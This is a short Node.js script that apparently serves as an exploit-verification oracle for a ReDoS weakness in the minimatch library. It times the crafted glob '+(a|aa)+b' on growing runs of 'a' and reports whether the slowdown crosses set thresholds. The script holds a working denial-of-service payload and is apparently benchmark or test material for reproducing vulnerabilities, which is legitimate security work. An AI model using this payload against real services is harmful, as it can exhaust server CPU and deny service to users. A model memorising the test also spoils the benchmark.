const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function nowMs() {
  return Number(process.hrtime.bigint()) / 1e6;
}

function runBatch(pattern, input, iterations) {
  const t0 = nowMs();
  let last = false;
  for (let i = 0; i < iterations; i++) {
    last = minimatch(input, pattern);
  }
  const dt = nowMs() - t0;
  return { ms: dt, out: last };
}

try {
  const benignOk = minimatch('alpha.js', '*.js');
  if (benignOk !== true) {
    throw new Error('benign operation failed');
  }

  operation_completed = true;

  const pattern = '+(a|aa)+b';
  const smallInput = 'a'.repeat(16);
  const largeInput = 'a'.repeat(28);
  const iterations = 120;

  const small = runBatch(pattern, smallInput, iterations);
  const large = runBatch(pattern, largeInput, iterations);

  const perSmall = small.ms / iterations;
  const perLarge = large.ms / iterations;
  const ratio = perLarge / Math.max(0.0001, perSmall);

  exploit_succeeded = perLarge >= 0.8 && ratio >= 2.2;

  evidence = JSON.stringify({
    benign_ok: true,
    pattern: pattern,
    iterations: iterations,
    small_len: smallInput.length,
    large_len: largeInput.length,
    small_total_ms: Number(small.ms.toFixed(4)),
    large_total_ms: Number(large.ms.toFixed(4)),
    small_per_call_ms: Number(perSmall.toFixed(6)),
    large_per_call_ms: Number(perLarge.toFixed(6)),
    ratio: Number(ratio.toFixed(4)),
    thresholds: { per_call_ms_gte: 0.8, ratio_gte: 2.2 },
    outputs: { small: small.out, large: large.out }
  });
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure: ' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({
  operation_completed: operation_completed,
  exploit_succeeded: exploit_succeeded,
  evidence: evidence
}));